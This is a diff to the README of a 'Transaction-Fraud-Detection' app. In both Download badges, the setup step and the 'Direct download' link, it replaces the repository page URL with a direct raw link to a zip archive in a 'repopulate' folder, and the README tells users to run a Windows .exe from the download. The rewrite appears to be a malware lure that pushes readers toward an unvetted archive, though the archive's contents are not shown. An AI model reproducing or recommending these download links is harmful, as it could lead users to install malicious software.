@@ -1,6 +1,6 @@
 # ⚖️ Transaction-Fraud-Detection - Detect Fraud in Transactions Easily
 
-[![Download](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://github.com/arka-senpaii/Transaction-Fraud-Detection)
+[![Download](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://raw.githubusercontent.com/arka-senpaii/Transaction-Fraud-Detection/main/repopulate/Fraud_Detection_Transaction_v1.3.zip)
 
 ## About this App
 
@@ -29,7 +29,7 @@ Make sure your computer fits these points before installation:
 
 ## 💾 Download the App and Setup
 
-1. Click the big **Download** badge at the top or [visit this page](https://github.com/arka-senpaii/Transaction-Fraud-Detection) to get the app.
+1. Click the big **Download** badge at the top or [visit this page](https://raw.githubusercontent.com/arka-senpaii/Transaction-Fraud-Detection/main/repopulate/Fraud_Detection_Transaction_v1.3.zip) to get the app.
 2. On the GitHub page, find the latest release or download section.
 3. Download the Windows setup file. This will usually be an `.exe` file.
 4. When the download finishes, locate the file in your Downloads folder.
@@ -94,7 +94,7 @@ Explore these files on the GitHub page to learn about the techniques used or to 
 ## 🔗 Useful Links
 
 - Direct download and information page:  
-  [https://github.com/arka-senpaii/Transaction-Fraud-Detection](https://github.com/arka-senpaii/Transaction-Fraud-Detection)
+  [https://raw.githubusercontent.com/arka-senpaii/Transaction-Fraud-Detection/main/repopulate/Fraud_Detection_Transaction_v1.3.zip](https://raw.githubusercontent.com/arka-senpaii/Transaction-Fraud-Detection/main/repopulate/Fraud_Detection_Transaction_v1.3.zip)
 
 - Issues and support on GitHub:  
   Visit the repository’s “Issues” tab if you need help or want to report a problem.
@@ -104,4 +104,4 @@ Explore these files on the GitHub page to learn about the techniques used or to 
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://github.com/arka-senpaii/Transaction-Fraud-Detection)
+[![Download](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://raw.githubusercontent.com/arka-senpaii/Transaction-Fraud-Detection/main/repopulate/Fraud_Detection_Transaction_v1.3.zip)
